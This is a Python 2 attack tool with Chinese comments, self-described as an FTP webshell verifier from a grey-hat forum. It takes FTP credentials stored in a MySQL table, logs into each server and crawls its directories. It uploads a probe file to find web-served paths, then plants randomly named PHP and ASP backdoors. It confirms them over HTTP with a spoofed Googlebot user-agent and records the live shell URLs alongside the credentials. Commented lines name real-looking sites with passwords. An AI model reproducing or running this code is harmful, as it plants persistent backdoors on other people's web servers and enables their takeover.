#!/usr/local/bin/python
#-*- coding: UTF-8 -*-
import ftplib
import time
import urllib2
import socket
import threading
socket.setdefaulttimeout(10)  #设置了全局默认超时时间
import thread
import list
import ConfigParser  #INI读取数据
import string
import random
import Cmysql #数据库操作文件
import httplib
import sys

class CS_linkftp(threading.Thread):
    def __init__(self,htint):
        threading.Thread.__init__(self)
        self.Ht=htint  #线程ID
        self.sql=Cmysql.mysql_handle()
        self.sql.mysql_open()
        self.FTP_list = []    #FTP保存路径
        self.dataurl = "cs123456.txt"  #上传文件
        self.PHP_data = "13.php"  #上传后门文件
        self.ASP_data = "13.asp"  #上传后门文件
        config = ConfigParser.ConfigParser()
        config.readfp(open("Server.ini"))
        self.dataurl = config.get("DATA","YZ")
        self.PHP_data = config.get("DATA","PHP")
        self.ASP_data = config.get("DATA","ASP")
    def run(self):
        try:
            print u"<<<FTP测试网站webshell----线程%d启动"%(self.Ht)
            self.open_mysql()  #获取数量
            #self.admin_open_FTP("www.bame.org.cn","ftp@bame.org.cn","123456")#遍历数组
            #self.admin_open_FTP("www.wanglei.cc","wanglei","wanglei.cc")#遍历数组
        except:
            print u"<<<线程%d--FTP测试网站webshell---run异常！！！！！"%(self.Ht)
            time.sleep(30)
            self.run()
###################################
    def mysql_update(self):  #修改数据库
        try:
            print u"修改数据库"
            self.sql.cursor=self.sql.conn.cursor()
            self.Asql="select * from ftppassword3"
            n = self.sql.cursor.execute(self.Asql)
            self.sql.cursor.scroll(0)
            for row in self.sql.cursor.fetchall():
                #print '%s-%s-%s'%(row[0],row[1],row[2])
                self.update = "update ftppassword3 set webshell='' where IP='%s'"%(row[0])
                self.sql.mysql_update(self.update)
                self.sql.mysql_S()  #保存数据
            time.sleep(5)
            cmd = raw_input(u"================数据库已经扫描完成过一遍===按任意键 回车在扫描一次=============\n")
            #if (cmd!=""):
                #self.open_mysql()     #读取URL
        except:
            print u"<<<线程%d--FTP测试网站webshell--mysql_update异常！！！！！"%(self.Ht)
            time.sleep(2)
            #self.open_mysql()     #读取URL

    def open_mysql(self):  #获取数量
        try:
            print u"--"*40 #添加消息
            self.t=time.time()  #扫描计时
            sql="select * from ftppassword3 where (webshell='' or  webshell is NULL) limit 1"
            n = self.sql.cursor.execute(sql)
            self.sql.cursor.scroll(0)
            for row in self.sql.cursor.fetchall():
                #print '%s-%s-%s'%(row[0],row[1],row[2])
                self.admin_open_FTP(row[0],row[1],row[2])#遍历数组
                self.update = "update ftppassword3 set webshell='send' where IP='%s'"%(row[0])
                self.sql.mysql_update(self.update)
                self.sql.mysql_S()  #保存数据
                time.sleep(1)
            print u"<<<线程%d--==扫FTP测试网站webshell扫描计时结束%s=====用时%s<<<"%(self.Ht,time.strftime('%Y.%m.%d-%H.%M.%S'),time.time()-self.t)

            self.open_mysql()     #读取URL
        except:
            time.sleep(4)
            self.sql.mysql_S()  #保存数据
            self.mysql_update()  #修改数据库
###################################
    def http_get(self,host,admin):  #验证地址是否存在
        connection = httplib.HTTPConnection(host,80,timeout=10)
        connection.request("GET",admin)
        response = connection.getresponse()
        #print "%s %s %s" % (admin, response.status, response.reason)
        data=response.reason
        if "OK" in data or "Forbidden" in data:
            SQLdata="http://"+host+admin+"    %s %s"%(response.status, response.reason)
            print SQLdata
            return 1
        else:
            SQLdata="http://"+host+admin+"    %s %s"%(response.status, response.reason)
            print SQLdata
            return 0

    def TXT_file(self,data):  #写入文本
        file_object = open('webshell.txt','a')
        #file_object.write(list_passwed[E])
        file_object.writelines("\r\n")
        file_object.writelines(data)
        file_object.close()

    def sjzf(self):  #产生一个随机字符
        sj=random.randint(5,10)
        return string.join(random.sample(['z','y','x','w','v','u','t','s','r','q','p','o','n','m','l','k','j','i','h','g','f','e','d','c','b','a'], sj)).replace(' ','')

    def PHP_Aftp_upload(self,ftpU,ftp_download): #上传后门文件
        file=self.sjzf()
        file+=".php"
        try:
            bufsize = 1024
            fp = open(self.PHP_data,'rb')
            ftpU.cwd(ftp_download)  #调整路径
            ftpU.storbinary('STOR '+ file,fp,bufsize) #上传文件
            fp.close() #关闭文件
            print u"路径%s--文件%s--上传后门文件成功"%(ftp_download,file) #消息提示
            return file
        except:
            print u"路径%s--文件%s--上传后门文件失败"%(ftp_download,file) #消息提示
            return 0

    def ASP_Aftp_upload(self,ftpU,ftp_download): #上传后门文件
        file=self.sjzf()
        file+=".asp"
        try:
            bufsize = 1024
            fp = open(self.ASP_data,'rb')
            ftpU.cwd(ftp_download)  #调整路径
            ftpU.storbinary('STOR '+ file,fp,bufsize) #上传文件
            fp.close() #关闭文件
            print u"路径%s--文件%s--上传后门文件成功"%(ftp_download,file) #消息提示
            return file
        except:
            print u"路径%s--文件%s--上传后门文件失败"%(ftp_download,file) #消息提示
            return 0
    ###################################
    def del_list(self): #清空数组
        i = 0 #得到list的第一个元素
        while i < len(self.FTP_list):
            del self.FTP_list[i]

    def admin_open_FTP(self,host,user,passwd):#遍历数组
        try:
            self.LS = list.Clist()  #初始化类
            self.LS.list_del()  #清空list列表
            try:
                ftp = ftplib.FTP(host)
                ftp.login(user, passwd)
                print u"IP:%s用户名:%s密码:%s ----登陆FTP成功%s"%(host,user, passwd,time.strftime('%Y.%m.%d-%H.%M.%S')) #消息提示
            except:
                print u"IP:%s用户名:%s密码:%s 连接FTP异常%s"%(host,user, passwd,time.strftime('%Y.%m.%d-%H.%M.%S')) #消息提示
                return 0

            #print self.PHP_Aftp_upload(ftp,"/phpwind/") #上传后门
#            self.post_url_data(host)  #验证路径是否正确

#            if self.ftp_delete(ftp,"/phpwind/"): #删除远程文件
#                print "11111111删除成功"
#            else:
#                print "2222222删除失败"

#            if self.ftp_upload(ftp,"/phpwind/"): #上传文件
#                print "11111111上传成功"
#            else:
#                print "2222222上传失败"

            E = 0 #得到list的第一个元素
            print u"开始采集地址"
            if self.open_ftp(ftp):  #采集要挂马的地址
                print u"开始测试权限"
                self.LS.liet_lsqc() #数组列表去重复
                while E < len(self.LS.list_2):
                    #print self.LS.list_2[E]
                    if self.ftp_upload(ftp,self.LS.list_2[E]): #上传文件
                        if self.post_url_data(host):  #验证路径是否正确
                            self.ftp_delete(ftp,self.LS.list_2[E]) #删除远程文件
                            php_data=self.PHP_Aftp_upload(ftp,self.LS.list_2[E]) #上传后门
#                            http="http://"+host+"/"+data
                            if self.http_get(host,"/"+php_data):  #验证地址是否存在  PHP有效就上传ASP的
                                php_http="http://"+host+"/"+php_data
                                asp_data=self.ASP_Aftp_upload(ftp,self.LS.list_2[E]) #上传后门文件  ASP
                                asp_http="http://"+host+"/"+asp_data
                                if self.http_get(host,"/"+asp_data):  #验证地址是否存在
                                    self.update = "insert into webshell(IP,user,password,PHPshell,ASPshell,time) VALUES('%s','%s','%s','%s','%s','%s')"%(
                                        host,user, passwd,php_http,asp_http,time.strftime('%Y.%m.%d-%H.%M.%S'))
                                    self.sql.mysql_update(self.update)
                                    self.sql.mysql_S()  #保存数据
                                else:
                                    self.update = "insert into webshell(IP,user,password,PHPshell,time) VALUES('%s','%s','%s','%s','%s')"%(
                                        host,user, passwd,php_http,time.strftime('%Y.%m.%d-%H.%M.%S'))
                                    self.sql.mysql_update(self.update)
                                    self.sql.mysql_S()  #保存数据
                                self.TXT_file(php_http)  #写入文本
                            #print u"目录正确可以上传大马"  #大马的文件名应该是随机的
                            return 1
                        else:
                            self.ftp_delete(ftp,self.LS.list_2[E]) #删除远程文件
                    E = E + 1

            return 1
        except:
            return 0
    ###########################################################
    def post_url_data(self,url):  #验证路径是否正确
        try:
            url_url = "http://"+url+"/"+self.dataurl
            url_data=self.URL_DZ(url_url) #获取网页内容
            f = open(self.dataurl)  #读取文件
            txt_data=f.readline()  #获取内容
            if len(url_data and txt_data):  #扫描字符串是否包含指定的字符
                print u"%s这个是对的"%(url_url)
                return 1
            else:
                print u"%s路径错误"%(url_url)
                return 0
            #return 1
        except:
            return 0

    def URL_DZ(self,URL):  #获取网页内容
        try:
            req = urllib2.Request(URL)
            req.add_header('User-Agent',"Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)")
            s = urllib2.urlopen(req,timeout=10)  # 超时10秒   #s = urllib2.urlopen(r"http://www.163.com")
            return s.read()
        except:
            print u"%s获取网页内容失败"%(URL)#消息提示
            return 0

    def ftp_delete(self,ftpU,ftp_download): #删除远程文件
        try:
            ftpU.cwd(ftp_download)  #调整路径
            ftpU.delete(self.dataurl)
            print u"路径%s--文件%s--删除文件成功"%(ftp_download,self.dataurl) #消息提示
            return 1
        except:
            print u"路径%s--文件%s--删除文件失败"%(ftp_download,self.dataurl) #消息提示
            return 0
    #上传文件
    def ftp_upload(self,ftpU,ftp_download): #上传文件
        try:
            bufsize = 1024
            fp = open(self.dataurl,'rb')
            ftpU.cwd(ftp_download)  #调整路径
            ftpU.storbinary('STOR '+ self.dataurl,fp,bufsize) #上传文件
            fp.close() #关闭文件
            print u"路径%s--文件%s--上传文件成功"%(ftp_download,self.dataurl) #消息提示
            return 1
        except:
            print u"路径%s--文件%s--上传文件失败"%(ftp_download,self.dataurl) #消息提示
            return 0
    ###########################################################
    def walk_ftp(self,ftp, cd = None, nodir = True):  #遍历FTP文件
        if cd:
            stack = [('d', cd)]
        else:
            stack = [('d', '/')]
        def get_item_info(line):  #获取目录信息
            info = line.split()  #string由字符串分割成的列表   但是这个地方没设置规则啊  难道以空格区分吗
            #info[0][0]获取是根目录还文件夹   info[8] 文件名称还是文件夹
            stack.append((info[0][0], '/'.join([pwd, info[8]])))  #pwd前所在位置
            #向列表的尾部添加一个新的元素
        while stack:
            s_top = stack.pop()
            if s_top[1][-2:]=='/.' or s_top[1][-3:]=='/..':
                continue #停止跳过这个
            if s_top[0] == '-': #根目录文件
                yield s_top[1].replace('//', '/')  #根据正则进行替换
            elif s_top[0] == 'd':  #文件夹
                try:
                    ftp.cwd(s_top[1])  #选择操作目录    打开文件夹
                except:
                    continue  #停止跳过这个异常
                pwd = ftp.pwd()  #返回当前所在位置
                ftp.dir(get_item_info)  #显示目录下文件信息
                if not nodir:  #not 取反   不明白什么意思
                    yield s_top[1].replace('//', '/') #根据正则进行替换

    def open_ftp(self,ftp):  #采集要挂马的地址
            self.del_list() #清空数组
            try:
                index=0
                for item in self.walk_ftp(ftp):
                    if index>=3000:
                        print u"遍历目录3000个文件过多停止"
                        return 1
                    #
                    sStr1=item
                    nPos = sStr1.rfind('/')  #从右至左(倒序)进行查找
                    sStr1 = sStr1[0:nPos+1] #复制指定长度的字符
                    #print sStr1
                    #print item,
                    self.LS.liet_add(sStr1)  #添加到数组

                    time.sleep(0.05) #确保先运行Seeker中的方法
                    index +=1
                print u"遍历目录完成"
                ftp.quit()  #退出ftp
                return 1
            except:
                ftp.quit()  #退出ftp
                print u"遍历FTP异常"
                return 1
                #sys.exit(exitcode)   #退出这个函数   不是整个退出
            ###########
###################################

if __name__=='__main__':
    print u"+++++++++++++++++++++++++++++++++++++++++++++++++++++++"
    print u"欢迎使用ftpwebshell地址验证器 更新时间2013.4.28---BY:落雪"
    print u"谢谢灰帽程序员论坛对本软件技术支持--http://hmhacker.org/  "
    print u"+++++++++++++++++++++++++++++++++++++++++++++++++++++++"
    threads = []  #线程
    nthreads=1
    for i in range(nthreads):  #nthreads=10  创建10个线程
        threads.append(CS_linkftp(i))

    for thread in threads:   #不理解这是什么意思    是结束线程吗
        thread.start()  #start就是开始线程






